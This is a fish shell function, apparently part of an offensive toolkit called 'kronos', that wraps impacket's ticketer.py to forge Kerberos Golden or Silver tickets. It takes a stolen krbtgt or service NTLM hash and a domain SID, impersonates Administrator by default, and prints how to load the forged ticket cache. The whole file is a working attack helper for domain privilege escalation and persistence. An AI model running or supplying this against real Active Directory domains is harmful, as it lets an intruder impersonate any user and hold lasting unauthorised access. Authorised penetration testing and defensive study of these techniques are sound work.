# description: Create Golden and Silver Tickets using ticketer.py
function __kronos_ticket --description "Create Golden and Silver Tickets using ticketer.py"
    argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos ticket [OPTIONS]"
        echo ""
        echo "Create Golden or Silver tickets using impacket's ticketer.py."
        echo ""
        echo "Options:"
        echo "  -u, --user USER     User to create the ticket for (default: Administrator)"
        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_DC_DOMAIN)"
        echo "  -S, --sid SID       Domain SID"
        echo "  -H, --hash HASH     krbtgt NTLM hash (Golden) or service NTLM hash (Silver)"
        echo "  -s, --spn SPN       Target SPN (for Silver Ticket, e.g., cifs/dc.domain.com)"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l domain $_flag_domain
    if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
    if test -z "$domain"
        echo "error: domain is required (-d)" >&2
        return 1
    end

    if not set -q _flag_sid
        echo "error: domain SID is required (-S)" >&2
        return 1
    end

    if not set -q _flag_hash
        echo "error: hash is required (-H)" >&2
        return 1
    end

    set -l target_user "Administrator"
    if set -q _flag_user
        set target_user $_flag_user
    end

    set -l impacket_cmd ""
    if command -v ticketer.py >/dev/null
        set impacket_cmd ticketer.py
    else if command -v impacket-ticketer >/dev/null
        set impacket_cmd impacket-ticketer
    else
        echo "error: ticketer not found. run 'kronos install'." >&2
        return 1
    end

    set -l ticket_args -nthash "$_flag_hash" -domain-sid "$_flag_sid" -domain "$domain"
    if set -q _flag_spn
        set -a ticket_args -spn "$_flag_spn"
        echo "[*] Forging Silver Ticket for $target_user..."
    else
        echo "[*] Forging Golden Ticket for $target_user..."
    end
    set -a ticket_args "$target_user"

    command $impacket_cmd $ticket_args
    
    if test -f "$target_user.ccache"
        echo "[+] Ticket saved to $target_user.ccache"
        echo "Use 'export KRB5CCNAME=$PWD/$target_user.ccache' to use it."
    end
end
